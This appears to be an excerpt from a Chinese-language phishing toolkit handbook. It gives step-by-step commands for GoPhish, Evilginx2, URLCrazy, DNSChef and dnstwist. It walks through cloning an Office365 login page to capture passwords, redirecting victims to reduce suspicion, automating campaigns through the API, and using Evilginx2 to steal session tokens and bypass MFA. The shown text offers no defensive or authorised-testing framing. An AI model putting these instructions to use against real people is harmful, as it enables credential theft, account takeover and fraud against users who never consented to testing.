### 一、GoPhish 钓鱼平台完整使用指南

#### 1.1 安装与启动
```bash
# 下载安装
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d gophish
cd gophish

# 修改监听地址（编辑config.json）
# 默认监听 127.0.0.1:3333（管理界面）和 127.0.0.1:8080（钓鱼页面）
sed -i 's/127.0.0.1/0.0.0.0/g' config.json

# 启动
chmod +x gophish
./gophish
# 默认账号：admin / gophish

# 后台运行
nohup ./gophish > gophish.log 2>&1 &
```

#### 1.4 钓鱼着陆页（Landing Page）配置
```
创建着陆页步骤：
Landing Pages -> New Page

基本选项：
├── 页面名称：Office365登录页
├── 导入站点：可直接导入真实网站
│   ├── 点击 "Import Site"
│   ├── 输入目标URL：https://login.microsoftonline.com
│   └── 自动克隆页面样式
├── 捕获凭证：✓ Capture Submissions
│   ├── 捕获密码：✓ Capture Passwords
│   └── 重定向URL：https://login.microsoftonline.com (真实登录页)
└── 捕获额外数据：可添加自定义字段

高级技巧：
1. 使用 "Import Site" 功能快速克隆真实登录页面
2. 启用 "Redirect to" 让用户点击后跳转到真实网站，降低怀疑
3. 添加静态资源（图片、CSS）使页面更逼真
4. 测试时使用浏览器隐私模式验证渲染效果
```

#### 1.7 GoPhish API 自动化
```bash
# API密钥获取：Admin -> Settings -> API Keys

# 获取所有活动
curl -H "Authorization: Bearer <API_KEY>" \
  https://gophish.example.com:3333/api/campaigns/

# 获取指定活动详情
curl -H "Authorization: Bearer <API_KEY>" \
  https://gophish.example.com:3333/api/campaigns/1

# 创建新活动
curl -X POST -H "Authorization: Bearer <API_KEY>" \
  -H "Content-Type: application/json" \
  https://gophish.example.com:3333/api/campaigns/ \
  -d '{
    "name": "API测试活动",
    "template_id": 1,
    "page_id": 1,
    "smtp_id": 1,
    "url": "https://phish.example.com",
    "groups": [{"id": 1}]
  }'

# 导出结果
curl -H "Authorization: Bearer <API_KEY>" \
  https://gophish.example.com:3333/api/campaigns/1/results.csv \
  -o results.csv
```

### 三、其他钓鱼工具与方法

#### 3.1 Evilginx2 - 高级钓鱼框架
```bash
# 安装
apt install golang-go
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# 启动
./bin/evilginx -p ./phishlets/

# 基本命令（交互模式）
config domain phishingserver.com      # 设置钓鱼域名
config ip 192.168.1.100               # 设置服务器IP
phishlets hostname o365 login.phishingserver.com  # 设置子域名
phishlets enable o365                 # 启用Office365钓鱼模板
lures create o365                     # 创建钓鱼链接
lures get-url 0                       # 获取钓鱼链接
sessions                              # 查看捕获的会话
sessions 0                            # 查看会话0详情

# 核心特点
# ├── 中间人代理捕获会话Token
# ├── 自动获取Cookie和Session
# ├── 绕过2FA/MFA认证
# ├── 支持多种服务模板（O365, Gmail, LinkedIn等）
# └── 透明代理，用户难以察觉
```

#### 3.3 钓鱼域名生成工具
```bash
# URLCrazy - 生成相似域名
urlcrazy domain.com
urlcrazy -r domain.com                    # 随机排序
urlcrazy -f csv domain.com > output.csv   # 输出CSV格式
urlcrazy -k domain.com                    # 检查域名是否已注册

# DNSChef - DNS欺骗工具
dnschef --fakeip=192.168.1.100 \
  --fakedomains=login.company.com \
  --interface=192.168.1.100

# dnstwist - 域名混淆检测
dnstwist --registered domain.com
dnstwist --geoip domain.com
dnstwist --format json domain.com > output.json
dnstwist --dictionary dictionaries/english.dict domain.com
```
